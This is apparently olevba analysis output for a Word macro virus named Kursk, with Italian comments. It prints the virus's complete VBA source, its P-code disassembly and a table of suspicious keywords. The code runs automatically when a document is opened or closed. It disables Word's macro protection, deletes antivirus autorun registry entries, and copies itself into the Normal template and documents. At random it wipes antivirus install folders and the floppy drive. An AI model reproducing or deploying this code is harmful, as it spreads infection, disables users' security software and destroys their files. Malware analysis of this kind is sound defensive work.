olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Krusk
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Krusk - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Kursk.bas 
in file: Virus.MSWord.Krusk - OLE stream: 'Macros/VBA/Kursk'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Rem QUESTO CODICE SERVE PER DISATTIVARE LE AUTO PROTEZIONI DEI VARI ANTIVIRUS
Options.VirusProtection = False
On Error Resume Next
Norton:
regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Norton Auto-Protect"
Mcafee:
regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Vshwin32EXE"
regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VsStatEXE"
regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\McAfeeWebScanX"
regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AvconsoleEXE"
Pc_cillin:
regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\PCCIOMON.EXE"
regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\pop3trap.exe"
regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WebTrap.exe"
AVP:
GoTo Panda
'L'AVP NON HA L'AUTOPROTEZIONE CHE SI CARICA ALL'AVVIO SE CI SBAGLIANO PERCHE' NON CI CONTATTI
Panda:
regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\ScanInicio"
regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\APVXDWIN"
If Day(Now) = 31 Then
WordBasic.MsgBox "~ 4B5552534B:4445434:4D41434B ~", vbCritical
Call AutoClose
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName: Application.Quit
End If
End Sub
Private Sub regdelete(regkey)
Set regedit = CreateObject("WScript.Shell")
regedit.regdelete regkey
End Sub
Sub AutoClose()
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error Resume Next
If NormalTemplate.VBProject.VBComponents.Item("Kursk").Name <> "Kursk" Then
NORMALNONINFETTO = True
ActiveDocument.VBProject.VBComponents("Kursk").Export "C:\Windows\Kursk.vxd"
Set INFECT = NormalTemplate.VBProject
End If
If ActiveDocument.VBProject.VBComponents.Item("Kursk").Name <> "Kursk" Then
DOCUMENTINONINFETTI = True
NormalTemplate.VBProject.VBComponents("Kursk").Export "C:\Windows\Kursk.vxd"
Set INFECT = ActiveDocument.VBProject
End If
If NORMALNONINFETTO = True Or DOCUMENTINONINFETTI = True Then INFECT.VBComponents.Import "C:\Windows\Kursk.vxd"
Kill "C:\Windows\Kursk.vxd"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
Antivirus:
Randomize
ns = Int((3 * Rnd) + 1)
If ns = 1 Then
GoTo Comment
ElseIf ns = 2 Then
GoTo Comment
ElseIf ns = 3 Then
Norton:
Kill "C:\Progra~1\Norton~1\*.*"
Set mso = CreateObject("Scripting.FilesystemObject")
Set fso = mso.CreateTextFile("C:\Progra~1\Norton~1\Norton.txt")
fso.WriteLine "THE KURSK IS DEATH IN THE SEA, BUT ITS GHOST IS IN YOUR COMPUTER"
fso.Close
Mcafee:
Kill "C:\Progra~1\Networ~1\Mcafee~1\*.*"
Set fsu = mso.CreateTextFile("C:\Progra~1\Networ~1\Mcafee~1\Mcafee.txt")
fsu.WriteLine "THE KURSK IS DEATH IN THE SEA, BUT ITS GHOST IS IN YOUR COMPUTER"
fsu.Close
Panda:
Kill "C:\Progra~1\Pandas~1\Pandaa~1\*.*"
Set pand = mso.CreateTextFile("C:\Progra~1\Pandas~1\Pandaa~1\Panda.txt")
pand.WriteLines "THE KURSK IS DEATH IN THE SEA, BUT ITS GHOST IS IN YOUR COMPUTER"
pand.Close
AVP:
Kill "C:\Progra~1\Antivi~1\*.*"
Set fsa = mso.CreateTextFile("C:\Progra~1\Antivi~1\Avp.txt")
fsa.WriteLine "THE KURSK IS DEATH IN THE SEA, BUT ITS GHOST IS IN YOUR COMPUTER"
fsa.Close
Pc_cillin:
Kill "C:\Progra~1\Trendp~1\*.*"
Set pcl = mso.CreateTextFile("C:\Progra~1\Trend~1\Pc-Cillin.txt")
pcl.WriteLines "THE KURSK IS DEATH IN SEA, BUT ITS GHOST IS IN YOUR COMPUTER"
pcl.Close
End If
Comment:
'***************************************************************************
'*                                      THE KURSK                          *
'***************************************************************************
'* THE KURSK IS A NUCLEAR POWERED SUBMARINE, IT IS DEATH IN THE BARENT SEA *
'* WE DEDICATE IT AT YOU FOR REMENBER THE CAPTAIN AND ITS SEAMAN THAT NOW  *
'* THEY'RE DEATH WHIT THE SUBMARINE                                        *
'* THE KURSK IS NOW A MACRO VIRUS WRITTEN BY 4445434A & 4D41434B           *
'* THIS NEW MACRO VIRUS INFECT THE NORMAL TEMPLATE AND THE WORD'S DOCUMENT *
'* THE KURSK DELETE ALL KNOW ANTIVIRUS (NORTON, MCAFEE, PANDA, AVP         *
'* AND PC-CILLIN).                                                         *
'***************************************************************************
'*                                    AND MANY MORE ++                     *
'***************************************************************************
Randomize
ng = Int((10 * Rnd) + 1)
If ng = 1 Then
GoTo ENIF
ElseIf ng = 2 Then
GoTo ENIF
ElseIf ng = 3 Then
GoTo ENIF
ElseIf ng = 4 Then
GoTo ENIF
ElseIf ng = 5 Then
GoTo ENIF
ElseIf ng = 6 Then
GoTo ENIF
ElseIf ng = 7 Then
GoTo ENIF
ElseIf ng = 8 Then
GoTo ENIF
ElseIf ng = 9 Then
GoTo ENIF
ElseIf ng = 10 Then
Kill "A:\*.*"
Set writeindrivera = mso.CreateTextFile("A:\Kursk.txt")
writeindrivera.WriteLine ("   ***************************************************************************")
writeindrivera.WriteLine ("   *                                THE KURSK                                *")
writeindrivera.WriteLine ("   ***************************************************************************")
writeindrivera.WriteLine ("   * THE KURSK IS A NUCLEAR POWERED SUBMARINE, IT IS DEATH IN THE BARENT SEA *")
writeindrivera.WriteLine ("   * WE DEDICATE IT AT YOU FOR REMENBER THE CAPTAIN AND ITS SEAMAN THAT NOW  *")
writeindrivera.WriteLine ("   * THEY'RE DEATH WHIT THE SUBMARINE                                        *")
writeindrivera.WriteLine ("   * THE KURSK IS NOW A MACRO VIRUS WRITTEN BY 4445434A & 4D41434B           *")
writeindrivera.WriteLine ("   * THIS NEW MACRO VIRUS INFECT THE NORMAL TEMPLATE AND THE WORD'S DOCUMENT *")
writeindrivera.WriteLine ("   * THE KURSK DELETE ALL KNOW ANTIVIRUS (NORTON, MCAFEE, PANDA, AVP         *")
writeindrivera.WriteLine ("   * AND PC-CILLIN).                                                         *")
writeindrivera.WriteLine ("   ***************************************************************************")
writeindrivera.WriteLine ("   *                              AND MANY MORE ++                           *")
writeindrivera.WriteLine ("   ***************************************************************************")
writeindrivera.Close
End If
ENIF: 'FINE
End Sub
Sub AutoNew() ' SI ATTIVA QUANDO SI APRE UN NUOVO DOCUMENTO
On Error Resume Next 'SU ERRORE VA AL PROSSIMO
Application.Assistant.Visible = True ' FA APPARIRE L'ASSISTANTE
Application.Assistant.Animation = msoAnimationGetTechy ' GLI FA ESEGUIRE UN'ANIMAZIONE
End Sub ' FINE DEL SOTTOPROGRAMMA
Rem if you find a bug please contact 4445434A & 4D41434B
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Krusk
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/Kursk - 11425 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	Rem 0x004A " QUESTO CODICE SERVE PER DISATTIVARE LE AUTO PROTEZIONI DEI VARI ANTIVIRUS"
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	Label Norton 
' Line #5:
' 	LitStr 0x0054 "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Norton Auto-Protect"
' 	ArgsCall regdelete 0x0001 
' Line #6:
' 	Label Mcafee 
' Line #7:
' 	LitStr 0x004C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Vshwin32EXE"
' 	ArgsCall regdelete 0x0001 
' Line #8:
' 	LitStr 0x004A "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VsStatEXE"
' 	ArgsCall regdelete 0x0001 
' Line #9:
' 	LitStr 0x004F "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\McAfeeWebScanX"
' 	ArgsCall regdelete 0x0001 
' Line #10:
' 	LitStr 0x004D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AvconsoleEXE"
' 	ArgsCall regdelete 0x0001 
' Line #11:
' 	Label Pc_cillin 
' Line #12:
' 	LitStr 0x004D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\PCCIOMON.EXE"
' 	ArgsCall regdelete 0x0001 
' Line #13:
' 	LitStr 0x004D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\pop3trap.exe"
' 	ArgsCall regdelete 0x0001 
' Line #14:
' 	LitStr 0x004C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WebTrap.exe"
' 	ArgsCall regdelete 0x0001 
' Line #15:
' 	Label AVP 
' Line #16:
' 	GoTo Panda 
' Line #17:
' 	QuoteRem 0x0000 0x005D "L'AVP NON HA L'AUTOPROTEZIONE CHE SI CARICA ALL'AVVIO SE CI SBAGLIANO PERCHE' NON CI CONTATTI"
' Line #18:
' 	Label Panda 
' Line #19:
' 	LitStr 0x004B "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\ScanInicio"
' 	ArgsCall regdelete 0x0001 
' Line #20:
' 	LitStr 0x0049 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\APVXDWIN"
' 	ArgsCall regdelete 0x0001 
' Line #21:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001F 
' 	Eq 
' 	IfBlock 
' Line #22:
' 	LitStr 0x001F "~ 4B5552534B:4445434:4D41434B ~"
' 	Ld vbCritical 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #23:
' 	ArgsCall (Call) AutoClose 0x0000 
' Line #24:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	BoS 0x0000 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Private Sub regdelete(regkey))
' Line #28:
' 	SetStmt 
' 	LitStr 0x000D "WScript.Shell"
' 	ArgsLd CreateObject 0x0001 
' 	Set regedit 
' Line #29:
' 	Ld regkey 
' 	Ld regedit 
' 	ArgsMemCall regdelete 0x0001 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub AutoClose())
' Line #32:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #33:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' 	LitStr 0x0005 "Kursk"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Kursk"
' 	Ne 
' 	IfBlock 
' Line #36:
' 	LitVarSpecial (True)
' 	St NORMALNONINFETTO 
' Line #37:
' 	LitStr 0x0014 "C:\Windows\Kursk.vxd"
' 	LitStr 0x0005 "Kursk"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #38:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set INFECT 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	LitStr 0x0005 "Kursk"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Kursk"
' 	Ne 
' 	IfBlock 
' Line #41:
' 	LitVarSpecial (True)
' 	St DOCUMENTINONINFETTI 
' Line #42:
' 	LitStr 0x0014 "C:\Windows\Kursk.vxd"
' 	LitStr 0x0005 "Kursk"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #43:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set INFECT 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld NORMALNONINFETTO 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld DOCUMENTINONINFETTI 
' 	LitVarSpecial (True)
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0014 "C:\Windows\Kursk.vxd"
' 	Ld INFECT 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #46:
' 	LitStr 0x0014 "C:\Windows\Kursk.vxd"
' 	ArgsCall Kill 0x0001 
' Line #47:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #48:
' 	Label Antivirus 
' Line #49:
' 	ArgsCall Read 0x0000 
' Line #50:
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St ns 
' Line #51:
' 	Ld ns 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #52:
' 	GoTo Comment 
' Line #53:
' 	Ld ns 
' 	LitDI2 0x0002 
' 	Eq 
' 	ElseIfBlock 
' Line #54:
' 	GoTo Comment 
' Line #55:
' 	Ld ns 
' 	LitDI2 0x0003 
' 	Eq 
' 	ElseIfBlock 
' Line #56:
' 	Label Norton 
' Line #57:
' 	LitStr 0x0018 "C:\Progra~1\Norton~1\*.*"
' 	ArgsCall Kill 0x0001 
' Line #58:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FilesystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set mso 
' Line #59:
' 	SetStmt 
' 	LitStr 0x001F "C:\Progra~1\Norton~1\Norton.txt"
' 	Ld mso 
' 	ArgsMemLd CreateTextFile 0x0001 
' 	Set fso 
' Line #60:
' 	LitStr 0x0040 "THE KURSK IS DEATH IN THE SEA, BUT ITS GHOST IS IN YOUR COMPUTER"
' 	Ld fso 
' 	ArgsMemCall WriteLine 0x0001 
' Line #61:
' 	Ld fso 
' 	ArgsMemCall Close 0x0000 
' Line #62:
' 	Label Mcafee 
' Line #63:
' 	LitStr 0x0021 "C:\Progra~1\Networ~1\Mcafee~1\*.*"
' 	ArgsCall Kill 0x0001 
' Line #64:
' 	SetStmt 
' 	LitStr 0x0028 "C:\Progra~1\Networ~1\Mcafee~1\Mcafee.txt"
' 	Ld mso 
' 	ArgsMemLd CreateTextFile 0x0001 
' 	Set fsu 
' Line #65:
' 	LitStr 0x0040 "THE KURSK IS DEATH IN THE SEA, BUT ITS GHOST IS IN YOUR COMPUTER"
' 	Ld fsu 
' 	ArgsMemCall WriteLine 0x0001 
' Line #66:
' 	Ld fsu 
' 	ArgsMemCall Close 0x0000 
' Line #67:
' 	Label Panda 
' Line #68:
' 	LitStr 0x0021 "C:\Progra~1\Pandas~1\Pandaa~1\*.*"
' 	ArgsCall Kill 0x0001 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0027 "C:\Progra~1\Pandas~1\Pandaa~1\Panda.txt"
' 	Ld mso 
' 	ArgsMemLd CreateTextFile 0x0001 
' 	Set pand 
' Line #70:
' 	LitStr 0x0040 "THE KURSK IS DEATH IN THE SEA, BUT ITS GHOST IS IN YOUR COMPUTER"
' 	Ld pand 
' 	ArgsMemCall WriteLines 0x0001 
' Line #71:
' 	Ld pand 
' 	ArgsMemCall Close 0x0000 
' Line #72:
' 	Label AVP 
' Line #73:
' 	LitStr 0x0018 "C:\Progra~1\Antivi~1\*.*"
' 	ArgsCall Kill 0x0001 
' Line #74:
' 	SetStmt 
' 	LitStr 0x001C "C:\Progra~1\Antivi~1\Avp.txt"
' 	Ld mso 
' 	ArgsMemLd CreateTextFile 0x0001 
' 	Set fsa 
' Line #75:
' 	LitStr 0x0040 "THE KURSK IS DEATH IN THE SEA, BUT ITS GHOST IS IN YOUR COMPUTER"
' 	Ld fsa 
' 	ArgsMemCall WriteLine 0x0001 
' Line #76:
' 	Ld fsa 
' 	ArgsMemCall Close 0x0000 
' Line #77:
' 	Label Pc_cillin 
' Line #78:
' 	LitStr 0x0018 "C:\Progra~1\Trendp~1\*.*"
' 	ArgsCall Kill 0x0001 
' Line #79:
' 	SetStmt 
' 	LitStr 0x0021 "C:\Progra~1\Trend~1\Pc-Cillin.txt"
' 	Ld mso 
' 	ArgsMemLd CreateTextFile 0x0001 
' 	Set pcl 
' Line #80:
' 	LitStr 0x003C "THE KURSK IS DEATH IN SEA, BUT ITS GHOST IS IN YOUR COMPUTER"
' 	Ld pcl 
' 	ArgsMemCall WriteLines 0x0001 
' Line #81:
' 	Ld pcl 
' 	ArgsMemCall Close 0x0000 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	Label Comment 
' Line #84:
' 	QuoteRem 0x0000 0x004B "***************************************************************************"
' Line #85:
' 	QuoteRem 0x0000 0x004B "*                                      THE KURSK                          *"
' Line #86:
' 	QuoteRem 0x0000 0x004B "***************************************************************************"
' Line #87:
' 	QuoteRem 0x0000 0x004B "* THE KURSK IS A NUCLEAR POWERED SUBMARINE, IT IS DEATH IN THE BARENT SEA *"
' Line #88:
' 	QuoteRem 0x0000 0x004B "* WE DEDICATE IT AT YOU FOR REMENBER THE CAPTAIN AND ITS SEAMAN THAT NOW  *"
' Line #89:
' 	QuoteRem 0x0000 0x004B "* THEY'RE DEATH WHIT THE SUBMARINE                                        *"
' Line #90:
' 	QuoteRem 0x0000 0x004B "* THE KURSK IS NOW A MACRO VIRUS WRITTEN BY 4445434A & 4D41434B           *"
' Line #91:
' 	QuoteRem 0x0000 0x004B "* THIS NEW MACRO VIRUS INFECT THE NORMAL TEMPLATE AND THE WORD'S DOCUMENT *"
' Line #92:
' 	QuoteRem 0x0000 0x004B "* THE KURSK DELETE ALL KNOW ANTIVIRUS (NORTON, MCAFEE, PANDA, AVP         *"
' Line #93:
' 	QuoteRem 0x0000 0x004B "* AND PC-CILLIN).                                                         *"
' Line #94:
' 	QuoteRem 0x0000 0x004B "***************************************************************************"
' Line #95:
' 	QuoteRem 0x0000 0x004B "*                                    AND MANY MORE ++                     *"
' Line #96:
' 	QuoteRem 0x0000 0x004B "***************************************************************************"
' Line #97:
' 	ArgsCall Read 0x0000 
' Line #98:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St ng 
' Line #99:
' 	Ld ng 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #100:
' 	GoTo ENIF 
' Line #101:
' 	Ld ng 
' 	LitDI2 0x0002 
' 	Eq 
' 	ElseIfBlock 
' Line #102:
' 	GoTo ENIF 
' Line #103:
' 	Ld ng 
' 	LitDI2 0x0003 
' 	Eq 
' 	ElseIfBlock 
' Line #104:
' 	GoTo ENIF 
' Line #105:
' 	Ld ng 
' 	LitDI2 0x0004 
' 	Eq 
' 	ElseIfBlock 
' Line #106:
' 	GoTo ENIF 
' Line #107:
' 	Ld ng 
' 	LitDI2 0x0005 
' 	Eq 
' 	ElseIfBlock 
' Line #108:
' 	GoTo ENIF 
' Line #109:
' 	Ld ng 
' 	LitDI2 0x0006 
' 	Eq 
' 	ElseIfBlock 
' Line #110:
' 	GoTo ENIF 
' Line #111:
' 	Ld ng 
' 	LitDI2 0x0007 
' 	Eq 
' 	ElseIfBlock 
' Line #112:
' 	GoTo ENIF 
' Line #113:
' 	Ld ng 
' 	LitDI2 0x0008 
' 	Eq 
' 	ElseIfBlock 
' Line #114:
' 	GoTo ENIF 
' Line #115:
' 	Ld ng 
' 	LitDI2 0x0009 
' 	Eq 
' 	ElseIfBlock 
' Line #116:
' 	GoTo ENIF 
' Line #117:
' 	Ld ng 
' 	LitDI2 0x000A 
' 	Eq 
' 	ElseIfBlock 
' Line #118:
' 	LitStr 0x0006 "A:\*.*"
' 	ArgsCall Kill 0x0001 
' Line #119:
' 	SetStmt 
' 	LitStr 0x000C "A:\Kursk.txt"
' 	Ld mso 
' 	ArgsMemLd CreateTextFile 0x0001 
' 	Set writeindrivera 
' Line #120:
' 	LitStr 0x004E "   ***************************************************************************"
' 	Paren 
' 	Ld writeindrivera 
' 	ArgsMemCall WriteLine 0x0001 
' Line #121:
' 	LitStr 0x004E "   *                                THE KURSK                                *"
' 	Paren 
' 	Ld writeindrivera 
' 	ArgsMemCall WriteLine 0x0001 
' Line #122:
' 	LitStr 0x004E "   ***************************************************************************"
' 	Paren 
' 	Ld writeindrivera 
' 	ArgsMemCall WriteLine 0x0001 
' Line #123:
' 	LitStr 0x004E "   * THE KURSK IS A NUCLEAR POWERED SUBMARINE, IT IS DEATH IN THE BARENT SEA *"
' 	Paren 
' 	Ld writeindrivera 
' 	ArgsMemCall WriteLine 0x0001 
' Line #124:
' 	LitStr 0x004E "   * WE DEDICATE IT AT YOU FOR REMENBER THE CAPTAIN AND ITS SEAMAN THAT NOW  *"
' 	Paren 
' 	Ld writeindrivera 
' 	ArgsMemCall WriteLine 0x0001 
' Line #125:
' 	LitStr 0x004E "   * THEY'RE DEATH WHIT THE SUBMARINE                                        *"
' 	Paren 
' 	Ld writeindrivera 
' 	ArgsMemCall WriteLine 0x0001 
' Line #126:
' 	LitStr 0x004E "   * THE KURSK IS NOW A MACRO VIRUS WRITTEN BY 4445434A & 4D41434B           *"
' 	Paren 
' 	Ld writeindrivera 
' 	ArgsMemCall WriteLine 0x0001 
' Line #127:
' 	LitStr 0x004E "   * THIS NEW MACRO VIRUS INFECT THE NORMAL TEMPLATE AND THE WORD'S DOCUMENT *"
' 	Paren 
' 	Ld writeindrivera 
' 	ArgsMemCall WriteLine 0x0001 
' Line #128:
' 	LitStr 0x004E "   * THE KURSK DELETE ALL KNOW ANTIVIRUS (NORTON, MCAFEE, PANDA, AVP         *"
' 	Paren 
' 	Ld writeindrivera 
' 	ArgsMemCall WriteLine 0x0001 
' Line #129:
' 	LitStr 0x004E "   * AND PC-CILLIN).                                                         *"
' 	Paren 
' 	Ld writeindrivera 
' 	ArgsMemCall WriteLine 0x0001 
' Line #130:
' 	LitStr 0x004E "   ***************************************************************************"
' 	Paren 
' 	Ld writeindrivera 
' 	ArgsMemCall WriteLine 0x0001 
' Line #131:
' 	LitStr 0x004E "   *                              AND MANY MORE ++                           *"
' 	Paren 
' 	Ld writeindrivera 
' 	ArgsMemCall WriteLine 0x0001 
' Line #132:
' 	LitStr 0x004E "   ***************************************************************************"
' 	Paren 
' 	Ld writeindrivera 
' 	ArgsMemCall WriteLine 0x0001 
' Line #133:
' 	Ld writeindrivera 
' 	ArgsMemCall Close 0x0000 
' Line #134:
' 	EndIfBlock 
' Line #135:
' 	Label ENIF 
' 	QuoteRem 0x0006 0x0004 "FINE"
' Line #136:
' 	EndSub 
' Line #137:
' 	FuncDefn (Sub AutoNew())
' 	QuoteRem 0x000E 0x002C " SI ATTIVA QUANDO SI APRE UN NUOVO DOCUMENTO"
' Line #138:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0018 "SU ERRORE VA AL PROSSIMO"
' Line #139:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemLd Assistant 
' 	MemSt Visible 
' 	QuoteRem 0x0025 0x0019 " FA APPARIRE L'ASSISTANTE"
' Line #140:
' 	Ld msoAnimationGetTechy 
' 	Ld Application 
' 	MemLd Assistant 
' 	MemSt Animation 
' 	QuoteRem 0x0037 0x001E " GLI FA ESEGUIRE UN'ANIMAZIONE"
' Line #141:
' 	EndSub 
' 	QuoteRem 0x0008 0x0018 " FINE DEL SOTTOPROGRAMMA"
' Line #142:
' 	Rem 0x0035 " if you find a bug please contact 4445434A & 4D41434B"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |PCCIOMON.EXE        |Executable file name                         |
|IOC       |pop3trap.exe        |Executable file name                         |
|IOC       |WebTrap.exe         |Executable file name                         |
|Hex String|KURSK               |4B5552534B                                   |
|Hex String|MACK                |4D41434B                                     |
|Hex String|DECJ                |4445434A                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

